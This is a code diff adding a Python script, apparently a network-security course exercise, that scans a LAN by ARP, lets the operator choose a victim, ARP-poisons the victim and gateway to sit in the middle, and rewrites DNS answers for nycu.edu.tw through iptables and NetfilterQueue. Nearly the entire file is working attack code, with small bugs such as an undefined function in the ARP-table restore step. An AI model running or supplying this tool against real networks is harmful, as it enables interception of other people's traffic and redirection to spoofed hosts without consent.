@@ -1,0 +1,148 @@
+#!/usr/bin/env python3
+from scapy.all import *
+from netfilterqueue import NetfilterQueue
+import netifaces as ni
+import ipaddress
+import os
+import sys 
+import time
+import threading
+
+def get_network_devices(target_ip):
+    arp = ARP(pdst=target_ip)
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = ether/arp
+    result = srp(packet, timeout=2, verbose=False)[0]
+    return result
+
+#get router ip
+os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+
+routerIP = ni.gateways()['default'][ni.AF_INET][0]
+routerMAC = ""
+interf = ni.gateways()['default'][ni.AF_INET][1]
+mask = ni.ifaddresses(interf)[ni.AF_INET][0]['netmask']
+thisIP = ni.ifaddresses(interf)[ni.AF_INET][0]['addr']
+thisMAC = ni.ifaddresses(interf)[ni.AF_LINK][0]['addr']
+
+print('router : ',routerIP)
+print('interface : ',interf)
+print('subnetmask : ',mask)
+
+network = ipaddress.IPv4Network(routerIP + '/' + mask, False)
+routerIPWMask = routerIP + '/' + network.compressed.split('/')[1]
+
+resultsMAC = []
+resultsIP = []
+
+#network scanner
+for i in range(5):
+    res = get_network_devices(routerIPWMask)
+    for sent, received in res:
+        resultsMAC.append(received.hwsrc)
+        resultsIP.append(received.psrc)
+
+print("-----------------------------------------")
+print("Availabe devices")
+print("-----------------------------------------\n\tIP\t\t     MAC\n-----------------------------------------")
+
+network_devices = []
+for i in range(len(resultsIP)):
+    if (resultsIP[i],resultsMAC[i]) not in network_devices:
+        network_devices.append((resultsIP[i],resultsMAC[i]))
+    if (resultsIP[i] == routerIP):
+        routerMAC = resultsMAC[i]
+
+for i in range(len(network_devices)):
+    if network_devices[i][0] != routerIP:
+        print(i," ",network_devices[i][0], "   ", network_devices[i][1])
+print("-----------------------------------------")
+
+selection = int(input('select ip by number: '))
+print(network_devices[selection], 'selected')
+
+#arp spoof
+victimIP = network_devices[selection][0]
+victimMAC = network_devices[selection][1]
+
+#gateway_ip = routerIP
+#target_ip = victim
+def spoof(target_ip, spoof_ip):
+    target = get_network_devices(target_ip)
+    target_mac = target[0][1].hwsrc
+    packet = ARP(op=2, pdst=target_ip,
+                       hwdst=target_mac,
+                       psrc=spoof_ip)
+    send(packet, verbose=False)
+
+def restore(destination_ip, source_ip):
+    destination = get_network_devices(destination_ip)
+    destination_mac = destination[0][1].hwsrc
+    source = get_network_device(source_ip)
+    source_mac = source[0][1].hwsrc
+    packet = ARP(op=2, pdst=destination_ip,
+                       hwdst=destination_mac,
+                       psrc=source_ip, hwsrc=source_mac)
+    send(packet, count=4, verbose=False)
+
+
+#dns spoof
+spoof_addr = {
+    b"nycu.edu.tw.": "140.113.207.246",
+    b"www.nycu.edu.tw.": "140.113.207.246"
+}
+
+def read_pkt(packet):
+    if packet[DNSQR].qname not in spoof_addr:
+        return packet
+    packet[DNS].an = DNSRR(rrname=packet[DNSQR].qname, rdata=spoof_addr[packet[DNSQR].qname])
+    packet[DNS].ancount = 1
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[UDP].len
+    del packet[UDP].chksum
+    return packet
+
+def process_packet(packet):
+    spkt = IP(packet.get_payload())
+    if spkt.haslayer(DNSRR):
+        try:
+            spkt = read_pkt(spkt)
+        except IndexError:
+            pass
+        packet.set_payload(bytes(spkt))
+    packet.accept()
+
+def job1():
+    send_packets_count = 0
+    while True:
+        spoof(victimIP, routerIP)
+        spoof(routerIP, victimIP)
+        send_packets_count += 2
+        #print(" \r[+] Packets sent: " + str(send_packets_count)),
+        sys.stdout.flush()
+        time.sleep(2)
+
+
+def job2():   
+    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(0))
+    queue = NetfilterQueue()
+    queue.bind(0, process_packet)
+    queue.run()
+
+
+t1 = threading.Thread(target=job1)
+t2 = threading.Thread(target=job2)
+try:
+    t1.start()
+    t2.start()
+except KeyboardInterrupt:        
+    restore(victimIP, routerIP)
+    restore(routerIP, victimIP)
+    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
+    print("\n[-] Detected CTRL + C ...."
+              "Resetting ARP tables....Please wait.\n")
+    os.system("iptables --flush")
+    print('tables flushed')
+
+
